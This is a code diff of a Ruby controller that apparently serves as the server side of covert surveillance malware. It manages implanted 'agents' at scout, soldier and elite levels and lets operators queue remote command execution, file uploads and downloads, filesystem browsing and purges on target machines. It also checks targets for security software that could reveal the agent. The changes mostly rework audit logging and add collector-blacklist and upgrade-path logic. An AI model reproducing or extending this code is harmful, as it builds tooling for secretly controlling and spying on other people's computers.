@@ -54,8 +54,8 @@ class AgentController < RESTController
         if item[key.to_s] != value and not key['_ids']
           Audit.log :actor => @session.user[:name],
                     :action => "#{item._kind}.update",
-                    (item._kind + '_name').to_sym => item['name'],
-                    :desc => "Updated '#{key}' to '#{value}' for #{item._kind} '#{item['name']}'"
+                    :_item => item,
+                    :desc => "Updated '#{key}' to '#{value}' for #{item._kind} #{item.name}"
         end
       end
       
@@ -73,7 +73,7 @@ class AgentController < RESTController
 
       Audit.log :actor => @session.user[:name],
                 :action => "#{item._kind}.delete",
-                (item._kind + '_name').to_sym => @params['name'],
+                :_item => item,
                 :desc => "Deleted #{item._kind} '#{item['name']}'"
 
       # if the deletion is permanent, destroy the item
@@ -200,7 +200,15 @@ class AgentController < RESTController
       agent = Item.any_in(user_ids: [@session.user[:_id]]).find(@params['_id'])
 
       @params['desc'] ||= ''
-      
+
+      addresses = Configuration.sync_hosts(@params['config'])
+      addresses.each do |address|
+        raise "Unable to save the configuration. The address #{address} is blacklisted." if agent.good and Collector.blacklisted?(address)
+        collector = Collector.where(address: address).first
+        next unless collector
+        raise "Incompatible collector #{address}" if collector.good != agent.good
+      end
+
       case agent._kind
         when 'agent'
           # the config was not sent, replace it
@@ -223,7 +231,7 @@ class AgentController < RESTController
       
       Audit.log :actor => @session.user[:name],
                 :action => "#{agent._kind}.config",
-                (agent._kind + '_name').to_sym => @params['name'],
+                :_item => agent,
                 :desc => "Saved configuration for agent '#{agent['name']}'"
       
       return ok(config)
@@ -255,7 +263,7 @@ class AgentController < RESTController
 
       Audit.log :actor => @session.user[:name],
                 :action => "#{agent._kind}.del_config",
-                (agent._kind + '_name').to_sym => @params['name'],
+                :_item => agent,
                 :desc => "Deleted configuration for agent '#{agent['name']}'"
       
       return ok
@@ -355,8 +363,7 @@ class AgentController < RESTController
     return not_found("Factory not found: #{@params['ident']}") if factory.nil?
 
     # the status of the factory must be open otherwise no instance can be cloned from it
-    return not_found("Factory is marked as compromised found: #{@params['ident']}") unless factory.good
-
+    return not_found("Factory marked as compromised found: #{@params['ident']}") unless factory.good
 
     trace :info, "Creating new instance for #{factory[:ident]} (#{factory[:counter]})"
 
@@ -430,7 +437,7 @@ class AgentController < RESTController
 
       Audit.log :actor => '<system>',
                     :action => "agent.uninstall",
-                    :agent_name => agent['name'],
+                    :_item => agent,
                     :desc => "Has sent the uninstall command to '#{agent['name']}'"
 
       agent.uninstalled = true
@@ -481,7 +488,7 @@ class AgentController < RESTController
     return not_found if agent.level.eql? :scout
 
     # don't send the config to agent too old
-    if agent.version < 2012041601
+    if agent.level.eql? :elite and agent.version < 2012041601
       trace :info, "Agent #{agent.name} is too old (#{agent.version}), new config will be skipped"
       return not_found
     end
@@ -561,7 +568,7 @@ class AgentController < RESTController
           upl['_grid_size'] = File.size Config.instance.temp(file)
           File.delete Config.instance.temp(file)
           agent.upload_requests.create(upl)
-          Audit.log :actor => @session.user[:name], :action => "agent.upload", :desc => "Added an upload request for agent '#{agent['name']}'"
+          Audit.log :actor => @session.user[:name], :action => "agent.upload", :desc => "Added an upload request for agent '#{agent['name']}'", :_item => agent
         when 'DELETE'
           agent.upload_requests.where({ _id: @params['upload']}).update({sent: Time.now.to_i})
           trace :info, "[#{@request[:peer]}] Deleted the UPLOAD #{@params['upload']}"
@@ -579,7 +586,7 @@ class AgentController < RESTController
     mongoid_query do
       agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
       agent.upload_requests.find(@params['upload']).destroy
-      Audit.log :actor => @session.user[:name], :action => "agent.upload", :desc => "Removed an upload request for agent '#{agent['name']}'"
+      Audit.log :actor => @session.user[:name], :action => "agent.upload", :desc => "Removed an upload request for agent '#{agent['name']}'", :_item => agent
       return ok
     end
   end
@@ -611,7 +618,7 @@ class AgentController < RESTController
         when 'POST'
           require_auth_level :tech_build
 
-          Audit.log :actor => @session.user[:name], :action => "agent.upgrade", :desc => "Requested an upgrade for agent '#{agent['name']}'"
+          Audit.log :actor => @session.user[:name], :action => "agent.upgrade", :desc => "Requested an upgrade for agent '#{agent['name']}'", :_item => agent
           trace :info, "Agent #{agent.name} request for upgrade"
           agent.upgrade! @params
           trace :info, "Agent #{agent.name} scheduled for upgrade"
@@ -633,6 +640,8 @@ class AgentController < RESTController
       agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
       # elite must not be checked for blacklisted software
       return ok(:elite) if agent.level.eql? :elite
+      # if already soldier, upgrade to soldier
+      return ok(:soldier) if agent.level.eql? :soldier
       # check if the agent can be upgraded and to which kind of agent
       kind = agent.blacklisted_software?
       trace :info, "Agent #{agent.name} can be upgraded to: #{kind}"
@@ -673,7 +682,7 @@ class AgentController < RESTController
         when 'POST'
           agent.download_requests.create(@params['download'])
           trace :info, "[#{@request[:peer]}] Added download request #{@params['download']}"
-          Audit.log :actor => @session.user[:name], :action => "agent.download", :desc => "Added a download request for agent '#{agent['name']}'"
+          Audit.log :actor => @session.user[:name], :action => "agent.download", :desc => "Added a download request for agent '#{agent['name']}'", :_item => agent
         when 'DELETE'
           agent.download_requests.find(@params['download']).destroy
           trace :info, "[#{@request[:peer]}] Deleted the DOWNLOAD #{@params['download']}"
@@ -690,7 +699,7 @@ class AgentController < RESTController
     mongoid_query do
       agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
       agent.download_requests.find(@params['download']).destroy
-      Audit.log :actor => @session.user[:name], :action => "agent.download", :desc => "Removed a download request for agent '#{agent['name']}'"
+      Audit.log :actor => @session.user[:name], :action => "agent.download", :desc => "Removed a download request for agent '#{agent['name']}'", :_item => agent
       return ok
     end
   end
@@ -731,7 +740,7 @@ class AgentController < RESTController
           end
 
           trace :info, "[#{@request[:peer]}] Added filesystem request #{@params['filesystem']}"
-          Audit.log :actor => @session.user[:name], :action => "agent.filesystem", :desc => "Added a filesystem request for agent '#{agent['name']}'"
+          Audit.log :actor => @session.user[:name], :action => "agent.filesystem", :desc => "Added a filesystem request for agent '#{agent['name']}'", :_item => agent
         when 'DELETE'
           agent.filesystem_requests.find(@params['filesystem']).destroy
           trace :info, "[#{@request[:peer]}] Deleted the FILESYSTEM #{@params['filesystem']}"
@@ -749,7 +758,7 @@ class AgentController < RESTController
     mongoid_query do
       agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
       agent.filesystem_requests.find(@params['filesystem']).destroy
-      Audit.log :actor => @session.user[:name], :action => "agent.filesystem", :desc => "Removed a filesystem request for agent '#{agent['name']}'"
+      Audit.log :actor => @session.user[:name], :action => "agent.filesystem", :desc => "Removed a filesystem request for agent '#{agent['name']}'", :_item => agent
       return ok
     end
   end
@@ -778,7 +787,7 @@ class AgentController < RESTController
           agent.purge = @params['purge']
           agent.save
           trace :info, "[#{@request[:peer]}] Added purge request #{@params['purge']}"
-          Audit.log :actor => @session.user[:name], :action => "agent.purge", :desc => "Issued a purge request for agent '#{agent['name']}'"
+          Audit.log :actor => @session.user[:name], :action => "agent.purge", :desc => "Issued a purge request for agent '#{agent['name']}'", :_item => agent
         when 'DELETE'
           agent.purge = [0, 0]
           agent.save
@@ -806,7 +815,7 @@ class AgentController < RESTController
 
           agent.exec_requests.create(@params['exec'])
           trace :info, "[#{@request[:peer]}] Added download request #{@params['exec']}"
-          Audit.log :actor => @session.user[:name], :action => "agent.exec", :desc => "Added a command execution request for agent '#{agent['name']}'"
+          Audit.log :actor => @session.user[:name], :action => "agent.exec", :desc => "Added a command execution request for agent '#{agent['name']}'", :_item => agent
         when 'DELETE'
           agent.exec_requests.find(@params['exec']).destroy
           trace :info, "[#{@request[:peer]}] Deleted the EXEC #{@params['exec']}"
@@ -824,7 +833,7 @@ class AgentController < RESTController
     mongoid_query do
       agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
       agent.exec_requests.find(@params['exec']).destroy
-      Audit.log :actor => @session.user[:name], :action => "agent.exec", :desc => "Removed a command execution request for agent '#{agent['name']}'"
+      Audit.log :actor => @session.user[:name], :action => "agent.exec", :desc => "Removed a command execution request for agent '#{agent['name']}'", :_item => agent
       return ok
     end
   end
